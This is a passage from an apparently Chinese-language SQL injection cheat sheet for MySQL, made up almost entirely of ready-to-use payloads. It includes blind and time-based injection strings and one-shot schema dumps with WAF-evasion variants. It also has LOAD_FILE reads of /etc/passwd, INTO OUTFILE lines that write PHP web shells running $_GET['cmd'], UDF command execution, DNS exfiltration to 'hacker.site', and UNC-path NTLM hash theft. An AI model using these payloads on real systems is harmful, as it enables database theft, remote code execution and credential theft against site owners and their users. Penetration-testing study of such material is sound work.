HTTP/1.1 500 Internal Server Error

2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
Response:
HTTP/1.1 200 OK
```

- make_set 盲注

```text
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```

- Like 盲注, '_' 匹配

```text
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
```

## Mysql 时间盲注

- 在子查询中 sleep

```text
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')# 
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like '_____')#
1 and (select sleep(10) from dual where database() like 'a____')#
...
1 and (select sleep(10) from dual where database() like 's____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
...
1 and (select sleep(10) from dual where database() like 'sw___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
...
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
```

- 使用条件语句

```text
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## Mysql 一次性转储 (disposable dump)

```text
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#

(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#

-- SecurityIdiots
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

-- Profexer
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)

-- Dr.Z3r0
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))

-- M@dBl00d
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))

-- Zen
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

-- Zen WAF
(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)

-- ~tr0jAn WAF
+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+

-- ~tr0jAn Benchmark
+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+

-- N1Z4M WAF
+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+

-- sharik
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
```

## Mysql 查看当前查询

```text
union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

-- Dump in one shot example for the table content.
union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## Mysql 读取文件内容

> 需要 file-priv，否则会有报错: `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```text
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

- 如果已连接数据库，可以重新启用LOAD_FILE

```text
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## Mysql GetShell

- 输出 Shell 到文件

```text
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

- Dump Shell 到文件

```text
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

## Mysql 截断

> 主要与 sql-mode 的值有关
> 默认(非严格模式)：default，
> 非严格模式："NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"
> 严格模式：："NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES"
> 在非严格模式下，如果插入数据超过已设置长度，则会警告而不是报错。

```text
select @@sql_mode	# 查看数据库模式
`username` varchar(20) not null
```

利用：`username = "admin a"` 加入空格填充长度，使最后一个a被截断，则成功插入admin用户

## Mysql 快速利用

> 使用 json_arrayagg 代替 group_concat，json_arrayagg 可以允许超过16000000个符号，group_concat 仅允许1024 个符号

- 版本 Mysql >= 5.7.22

```text
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

Use instead of which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() > 16,000,000 symbolsjson_arrayagg()group_concat()

## UDF 命令执行 & 提权

> 首先查看是否安装 UDF `$ whereis lib_mysqludf_sys.so`

```text
$ mysql -u root -p mysql
Enter password: [...]
mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

## Mysql 消息外带

> 用于无回显的环境中

```text
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
```

## DNS 外带

```less
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
```

## UNC 路径 - NTLM Hash 窃取

```text
select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\\\error\\abc';
select 'osanda' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
```


